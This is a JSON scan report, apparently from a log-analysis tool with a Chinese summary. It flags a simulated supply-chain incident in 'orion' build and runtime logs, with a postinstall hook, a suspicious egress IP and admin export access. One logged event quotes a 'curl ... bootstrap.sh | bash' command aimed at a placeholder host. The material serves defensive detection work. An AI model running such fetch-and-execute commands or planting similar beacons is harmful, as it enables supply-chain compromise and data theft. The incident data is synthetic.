@@ -1,0 +1,182 @@
+{
+    "scan_id":  "logs-20260612030957",
+    "generated_at":  "2026-06-12T03:09:57.923603+00:00",
+    "files":  [
+                  {
+                      "filename":  "orion-build-runner.log",
+                      "source":  "app",
+                      "size_bytes":  345,
+                      "total_lines":  4,
+                      "parsed_lines":  3,
+                      "skipped_lines":  1
+                  },
+                  {
+                      "filename":  "orion-runtime.jsonl",
+                      "source":  "app",
+                      "size_bytes":  636,
+                      "total_lines":  3,
+                      "parsed_lines":  3,
+                      "skipped_lines":  0
+                  }
+              ],
+    "summary":  {
+                    "file_count":  2,
+                    "total_lines":  7,
+                    "total_events":  6,
+                    "parsed_events":  6,
+                    "skipped_lines":  1,
+                    "finding_count":  2,
+                    "risk_score":  95,
+                    "risk_level":  "critical",
+                    "critical":  2,
+                    "high":  0,
+                    "medium":  0,
+                    "low":  0,
+                    "by_rule":  {
+                                    "runtime.sensitive-export-path":  1,
+                                    "runtime.suspicious-egress-ip":  1
+                                },
+                    "by_source":  {
+                                      "app":  5,
+                                      "web":  1
+                                  },
+                    "rule_count":  6,
+                    "duration_seconds":  3.91
+                },
+    "events":  [
+                   {
+                       "time":  "2026-06-11 09:57:10",
+                       "source":  "app",
+                       "log_type":  "app",
+                       "filename":  "orion-build-runner.log",
+                       "line_number":  1,
+                       "src_ip":  null,
+                       "dst_ip":  null,
+                       "user":  null,
+                       "method":  null,
+                       "path":  null,
+                       "status":  null,
+                       "message":  "2026-06-11T09:57:10Z source=build-runner event=npm_ci package=orion-build-utils@9.9.9 signal=postinstall",
+                       "raw":  "2026-06-11T09:57:10Z source=build-runner event=npm_ci package=orion-build-utils@9.9.9 signal=postinstall"
+                   },
+                   {
+                       "time":  "2026-06-11 09:58:04",
+                       "source":  "app",
+                       "log_type":  "app",
+                       "filename":  "orion-build-runner.log",
+                       "line_number":  2,
+                       "src_ip":  null,
+                       "dst_ip":  null,
+                       "user":  null,
+                       "method":  null,
+                       "path":  "/orion/bootstrap.sh",
+                       "status":  null,
+                       "message":  "2026-06-11T09:58:04Z source=build-runner event=remote_script message=\"curl https://updates.example.invalid/orion/bootstrap.sh | bash\"",
+                       "raw":  "2026-06-11T09:58:04Z source=build-runner event=remote_script message=\"curl https://updates.example.invalid/orion/bootstrap.sh | bash\""
+                   },
+                   {
+                       "time":  "2026-06-11 10:00:02",
+                       "source":  "app",
+                       "log_type":  "app",
+                       "filename":  "orion-build-runner.log",
+                       "line_number":  3,
+                       "src_ip":  null,
+                       "dst_ip":  null,
+                       "user":  null,
+                       "method":  null,
+                       "path":  null,
+                       "status":  null,
+                       "message":  "2026-06-11T10:00:02Z source=build-runner event=artifact_created name=orion-update.tar.gz digest=mismatch",
+                       "raw":  "2026-06-11T10:00:02Z source=build-runner event=artifact_created name=orion-update.tar.gz digest=mismatch"
+                   },
+                   {
+                       "time":  "2026-06-11 10:01:20",
+                       "source":  "app",
+                       "log_type":  "app",
+                       "filename":  "orion-runtime.jsonl",
+                       "line_number":  1,
+                       "src_ip":  null,
+                       "dst_ip":  null,
+                       "user":  null,
+                       "method":  null,
+                       "path":  "/updates/orion",
+                       "status":  200,
+                       "message":  "orion-update.tar.gz loaded during simulated replay window",
+                       "raw":  "{\"time\":\"2026-06-11T10:01:20Z\",\"source\":\"app\",\"service\":\"orion-update-service.prod\",\"event\":\"update_package_loaded\",\"message\":\"orion-update.tar.gz loaded during simulated replay window\",\"path\":\"/updates/orion\",\"status\":200}"
+                   },
+                   {
+                       "time":  "2026-06-11 10:03:44",
+                       "source":  "app",
+                       "log_type":  "app",
+                       "filename":  "orion-runtime.jsonl",
+                       "line_number":  2,
+                       "src_ip":  null,
+                       "dst_ip":  "45.83.64.10",
+                       "user":  null,
+                       "method":  null,
+                       "path":  null,
+                       "status":  0,
+                       "message":  "beacon egress callback destination 45.83.64.10 for updates.example.invalid",
+                       "raw":  "{\"time\":\"2026-06-11T10:03:44Z\",\"source\":\"app\",\"service\":\"orion-update-service.prod\",\"event\":\"egress\",\"message\":\"beacon egress callback destination 45.83.64.10 for updates.example.invalid\",\"dst_ip\":\"45.83.64.10\",\"status\":0}"
+                   },
+                   {
+                       "time":  "2026-06-11 10:04:12",
+                       "source":  "web",
+                       "log_type":  "web",
+                       "filename":  "orion-runtime.jsonl",
+                       "line_number":  3,
+                       "src_ip":  "10.10.4.23",
+                       "dst_ip":  null,
+                       "user":  null,
+                       "method":  "GET",
+                       "path":  "/admin/export",
+                       "status":  200,
+                       "message":  "sensitive export path accessed after update package load",
+                       "raw":  "{\"time\":\"2026-06-11T10:04:12Z\",\"source\":\"web\",\"method\":\"GET\",\"path\":\"/admin/export\",\"status\":200,\"src_ip\":\"10.10.4.23\",\"message\":\"sensitive export path accessed after update package load\"}"
+                   }
+               ],
+    "findings":  [
+                     {
+                         "id":  "LOG-584C6A99",
+                         "rule_id":  "runtime.sensitive-export-path",
+                         "title":  "Sensitive Export Or Configuration Path Access",
+                         "severity":  "critical",
+                         "score":  94,
+                         "time":  "2026-06-11 10:04:12",
+                         "source":  "web",
+                         "event":  "GET /admin/export",
+                         "signal":  "敏感路径访问",
+                         "confidence":  0.94,
+                         "evidence":  "GET /admin/export status=200",
+                         "src_ip":  "10.10.4.23",
+                         "dst_ip":  null,
+                         "user":  null,
+                         "path":  "/admin/export",
+                         "count":  null,
+                         "fingerprint":  "f4af77f29688f7d85da5579b38c0e7460ea5de81d366cd5749db85901c7bc57b"
+                     },
+                     {
+                         "id":  "LOG-FF06DB21",
+                         "rule_id":  "runtime.suspicious-egress-ip",
+                         "title":  "Suspicious External Egress IP",
+                         "severity":  "critical",
+                         "score":  92,
+                         "time":  "2026-06-11 10:03:44",
+                         "source":  "app",
+                         "event":  "app -\u003e 45.83.64.10",
+                         "signal":  "异常外联 IP",
+                         "confidence":  0.94,
+                         "evidence":  "{\"time\":\"2026-06-11T10:03:44Z\",\"source\":\"app\",\"service\":\"orion-update-service.prod\",\"event\":\"egress\",\"messa...con egress callback destination 45.83.64.10 for updates.example.invalid\",\"dst_ip\":\"45.83.64.10\",\"status\":0}",
+                         "src_ip":  null,
+                         "dst_ip":  "45.83.64.10",
+                         "user":  null,
+                         "path":  null,
+                         "count":  null,
+                         "fingerprint":  "7eb91b160c08f161c56b908bfad1a6235db603eaa27998b47deb1ef9ed323f18"
+                     }
+                 ],
+    "report":  "# 运行期日志风险识别报告\n\n生成时间：2026-06-12 03:10:01 UTC\n\n## 摘要\n\n- 日志文件：2\n- 解析事件：6\n- 跳过行数：1\n- 风险事件：2\n- 风险评分：95 / 100\n- 风险等级：critical\n\n## 日志来源\n\n| 文件 | 来源 | 总行数 | 已解析 | 跳过 |\n| --- | --- | ---: | ---: | ---: |\n| orion-build-runner.log | app | 4 | 3 | 1 |\n| orion-runtime.jsonl | app | 3 | 3 | 0 |\n\n## 风险事件\n\n| 编号 | 等级 | 异常时间 | 日志来源 | 风险事件 | 置信度 | 证据 |\n| --- | --- | --- | --- | --- | ---: | --- |\n| LOG-584C6A99 | critical | 2026-06-11 10:04:12 | web | 敏感路径访问 | 94% | GET /admin/export |\n| LOG-FF06DB21 | critical | 2026-06-11 10:03:44 | app | 异常外联 IP | 94% | app -\u003e 45.83.64.10 |\n\n## 扫描提示\n\n- 扫描完成。\n",
+    "warnings":  [
+
+                 ]
+}
